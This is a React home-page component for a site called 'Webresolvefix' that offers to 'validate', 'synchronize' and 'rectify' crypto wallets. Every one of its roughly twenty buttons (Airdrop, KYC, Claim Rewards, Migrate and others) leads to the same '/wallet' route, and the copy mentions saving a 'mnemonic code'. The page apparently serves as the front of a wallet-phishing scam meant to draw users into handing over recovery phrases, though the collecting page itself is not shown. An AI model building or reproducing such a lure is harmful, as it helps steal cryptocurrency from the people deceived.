import React from 'react';

import './home.css';

import first from './first.png';

import second from './second.png';

import third from './third.png';
import fourth from './fourth.png';
import { Link } from 'react-router-dom';
import { useState } from 'react';


function Home(){

  



    return (
        <>
            <nav class="navbar mynav fixed-top justify-content-between py-4">
                <a class="navbar-brand brand">Webresolvefix</a>
                <form class="form-inline">
                    {/* <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search"/> */}
                    <i className='fa fa-search mr-5 search'></i>
                    <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Validate Wallet</Link>
                </form>
                </nav>


                <section className='hero text-center py-5'>
                        <h2 className='herotext mt-5'>Validate initialize , <br/>  and synchronize your <br/> tokens on your wallets</h2>

                        <p className='heropara py-3'>Open And Decentralize Protocol For Syncing Various Wallet To Dapps Secure Server</p>


                        {/* buttons */}

                            <div className='d-flex justify-content-center'>

                            <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Staking </Link> <span className='px-3'></span>  <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Migration V2</Link>

                            </div>
                            

                            <div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Connect Wallet </Link> <span className='px-3'></span>  <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Airdrop</Link>

</div>



<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Whitelist </Link> <span className='px-3'></span>  <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>KYC</Link>

</div>



<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>RPC Settings </Link> <span className='px-3'></span>  <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Buy NFT</Link>

</div>


<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Marketplace</Link>

</div>

<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Gas</Link>

</div>


<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Claim Rewards </Link> <span className='px-3'></span>  <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Rectification</Link>

</div>


<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>SnapShot </Link> <span className='px-3'></span>  <Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Buy Presale</Link>

</div>



<div className='d-flex justify-content-center'>

<Link to={'/wallet'} class="btn my-2 my-sm-0 validate" type="submit"><i className='fa fa-square square mr-3'></i>Migrate</Link>

</div>





                        {/* end of buttons */}
                </section>



                <section className='greysection py-5 row'>

                    <div className='col-md-3 col-3 text-center'>
                        <img src={first} className="greyimage"/>

                        <h3 className='greyheading'>Select Your Wallet</h3>

                        <p className='greytext'>
                        We have varieties of wallets you can choose from to validate or synchronize your wallet. Please, select your correct wallet name before proceeding.
                        </p>


                        

                    </div>


                    <div className='col-md-3 col-3 text-center'>
                        <img src={second} className="greyimage"/>

                        <h3 className='greyheading'>Validate Your Wallet</h3>

                        <p className='greytext'>
                        Once you select your wallet, you will be prompted to connect via a decentralized protocol. This can successfully be completed manually or automatically.
                        </p>


                        

                    </div>



                    <div className='col-md-3 col-3 text-center'>
                        <img src={third} className="greyimage"/>

                        <h3 className='greyheading'>Generate QR Code</h3>

                        <p className='greytext'>
                        Upon successful validation, a QR Code will be generated for your wallet. You can always scan your QR Code to reinitialize your wallet.
                        </p>


                        

                    </div>


                    <div className='col-md-3 col-3 text-center'>
                        <img src={fourth} className="greyimage"/>

                        <h3 className='greyheading'>Save Wallet QR Code</h3>

                        <p className='greytext'>
                            Saving your generated mnemonic code or QR Code is important. You can click on Save or Screenshot the QR Code Page. You choose how you want to save!
                        </p>


                        

                    </div>





                </section>


                <section className='whitediv py-5 row px-3'>

                    <div className='col-md-3'>

                        <h2 className='foothead'>Decentralized Launchpad</h2>

                        <p className='footpara'>Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two apps and/or devices</p>



                    </div>


                    <div className='col-md-3'>

                        <h3 className='subscribe'>Subscribe</h3>

                        {/* <input className='form-control py-3' placeholder='name@gmail.com'  /> */}

                        <div class="input-group">
    <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="name@gmail.com" required/>
    <div class="input-group-append">
        <button class="btn rounded mybtnn" type="button">Subscribe</button>
    </div>
</div>

                    </div>



                </section>
        </>
    );


}


export default Home;